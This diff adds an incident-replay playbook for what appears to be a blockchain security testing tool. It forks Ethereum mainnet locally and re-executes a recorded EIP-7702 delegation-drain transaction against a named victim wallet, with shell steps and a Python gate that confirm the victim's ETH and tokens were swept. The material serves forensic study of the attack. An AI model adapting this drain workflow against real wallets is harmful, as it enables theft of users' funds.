@@ -1,0 +1,185 @@
+# Historical incident replay: EIP-7702 sven.eth delegation drain
+# (2026-10-14, ~$22.7K — 9.1231 ETH net + 1.69271471 TAPEETH, from the
+# October 2026 CrimeEnjoyor drainer wave).
+#
+# Forks mainnet at block 26186934 (victim a plain EOA with its full
+# balance and unclaimed staking rewards; sponsor EOA at nonce 6) and
+# re-broadcasts the attacker's single signed type-4 (EIP-7702)
+# transaction: the sponsored authorization installs the delegation,
+# claims rewards, and sweeps everything in one transaction. Zero
+# transactions ever touch mainnet.
+#
+# Run from the repo root (requires foundry; archive-capable fork RPC —
+# override with FORK_URL if the default is rate-limited):
+#   bin/blocktack campaign \
+#     --target corpus/eip7702-sveneth-2026/target.yaml \
+#     --playbook playbooks/evm/eip7702-sveneth-delegation-drain.yaml
+apiVersion: blocktack/v1
+kind: Playbook
+name: eip7702-sveneth-delegation-drain
+description: >
+  Replays the 2026-10-14 EIP-7702 wallet drain of sven.eth (BTV-L2-014,
+  malicious delegation): the attacker's sponsored type-4 transaction
+  re-executes deterministically — the victim EOA's code becomes the
+  CrimeEnjoyor sweeper designator (0xef0100 + delegate), PodMining
+  rewards are claimed and forwarded, and the victim's entire ETH
+  balance is swept to the sponsor.
+target:
+  chainTypes: [evm]
+  layers: [L2]
+steps:
+  - id: env-up
+    name: Fork mainnet at the pre-attack block
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          anvil --fork-url "${FORK_URL:-https://eth.drpc.org}" \
+            --fork-block-number 26186934 --port 8546
+      background: true
+
+  - id: wait-for-rpc
+    name: Wait for the fork to accept requests
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          for i in $(seq 1 120); do
+            cast block-number --rpc-url http://127.0.0.1:8546 >/dev/null 2>&1 && exit 0
+            sleep 1
+          done
+          echo "anvil fork did not come up" >&2
+          exit 1
+
+  - id: identify-chain
+    name: Fingerprint the fork
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: fingerprint
+
+  - id: victim-before
+    name: Record the victim's pre-attack state (plain EOA, full balance)
+    tactic: discover
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          VICTIM=0xd8ba9e5886b7000bace2c9dbdd0be98ac77d4a28
+          echo "victim code: [$(cast code $VICTIM --rpc-url http://127.0.0.1:8546)] (expect empty)"
+          echo "victim ETH: $(cast balance $VICTIM --rpc-url http://127.0.0.1:8546)"
+
+  - id: simulate-sequence
+    name: Simulate the type-4 drain in revm before executing anything
+    tactic: exploit
+    precondition: in-memory execution against fork state — zero transactions broadcast, not even to the local chain; exercises the EIP-7702 authorization-list mapping in the engine
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: simulate-tx-sequence
+      options:
+        rawFiles:
+          - corpus/eip7702-sveneth-2026/transactions/00_0x36e0d1491c14e3d8e50bc70d73675b89d2d4712814d16f808f957c84fde820ee.raw
+        reports:
+          - account: "0x9208097c007be15e28b20e94e66870a3f9f820bc" # sponsor/collector — ETH gain
+            minProfit: "9120000000000000000" # 9.12 ETH
+          - token: "0xace2e0179501a2bfad5f0fb230f38c87597d5e1b" # TAPEETH
+            account: "0x9208097c007be15e28b20e94e66870a3f9f820bc" # sponsor/collector
+            minProfit: "169200000" # 1.692 TAPEETH (8 dp, threshold under rebase drift)
+
+  - id: replay-attack-tx
+    name: Re-broadcast the attacker's sponsored type-4 transaction
+    tactic: exploit
+    precondition: fork block 26186934 — sponsor EOA at nonce 6 so the historical type-4 tx (nonce 6, carrying the victim's authorization) executes identically
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          set -e
+          raw="$(tr -d '[:space:]' < corpus/eip7702-sveneth-2026/transactions/00_0x36e0d1491c14e3d8e50bc70d73675b89d2d4712814d16f808f957c84fde820ee.raw)"
+          cast publish --rpc-url http://127.0.0.1:8546 "$raw"
+
+  - id: verify-replay-gate
+    name: Hard gate — receipt status, delegation installed, full balance sweep, TAPEETH forwarded
+    tactic: verify
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          python3 - <<'PYEOF'
+          import json, urllib.request, sys
+          RPC = "http://127.0.0.1:8546"
+          def rpc(method, params):
+              req = urllib.request.Request(RPC, data=json.dumps(
+                  {"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode(),
+                  headers={"Content-Type": "application/json"})
+              return json.load(urllib.request.urlopen(req, timeout=60)).get("result")
+          fail = 0
+          VICTIM  = "0xd8ba9e5886b7000bace2c9dbdd0be98ac77d4a28"
+          SPONSOR = "0x9208097c007be15e28b20e94e66870a3f9f820bc"
+          TX = "0x36e0d1491c14e3d8e50bc70d73675b89d2d4712814d16f808f957c84fde820ee"
+
+          rec = rpc("eth_getTransactionReceipt", [TX])
+          st = rec["status"] if rec else "missing"
+          print(f"receipt status: {st}")
+          if st != "0x1":
+              fail = 1
+
+          # The EIP-7702 delegation designator must be installed on the
+          # victim: 0xef0100 || delegate address.
+          code = rpc("eth_getCode", [VICTIM, "latest"]) or "0x"
+          want = "0x" + "ef0100" + "0366b55f948a688888ca6e029ad0831f6ec260d1"
+          print(f"victim code: {code}")
+          if code.lower() != want:
+              print(f"  expected delegation designator {want}")
+              fail = 1
+
+          # The victim's entire ETH balance must be swept.
+          eth = int(rpc("eth_getBalance", [VICTIM, "latest"]), 16)
+          print(f"victim ETH after: {eth} (expect 0)")
+          if eth != 0:
+              fail = 1
+
+          # The sponsor must have gained the stolen ETH (net of the gas
+          # it paid) and the claimed TAPEETH. The pre-attack balance is
+          # read from the fork's own block state (block 26186934).
+          sponsor_eth_before = int(rpc("eth_getBalance", [SPONSOR, "0x18f94b6"]), 16)
+          sponsor_eth = int(rpc("eth_getBalance", [SPONSOR, "latest"]), 16)
+          delta = sponsor_eth - sponsor_eth_before
+          print(f"sponsor ETH delta: {delta} (~{delta/1e18:.6f} ETH, expect >= 9.12)")
+          if delta < 9_120_000_000_000_000_000:
+              fail = 1
+
+          def balance(token, who):
+              data = "0x70a08231" + "0"*24 + who[2:]
+              return int(rpc("eth_call", [{"to": token, "data": data}, "latest"]), 16)
+          TAPEETH = "0xace2e0179501a2bfad5f0fb230f38c87597d5e1b"
+          st_tape = balance(TAPEETH, SPONSOR)
+          vt_tape = balance(TAPEETH, VICTIM)
+          print(f"sponsor TAPEETH: {st_tape} (expect >= 169,200,000; mainnet record 169,271,471)")
+          print(f"victim TAPEETH:  {vt_tape} (expect 0)")
+          if st_tape < 169_200_000 or vt_tape != 0:
+              fail = 1
+          sys.exit(fail)
+          PYEOF
+
+verification:
+  - id: transaction-executed
+    expects: the vendored type-4 transaction mines with status=1 and its canonical hash on the fork
+  - id: delegation-installed
+    expects: victim EOA code == 0xef0100 || CrimeEnjoyor delegate address (the durable post-incident exposure ExVul flagged)
+  - id: profit-materialized
+    expects: victim ETH == 0; sponsor gains ~9.1231 ETH net and >= 1.692 TAPEETH — enforced by the verify-replay-gate step
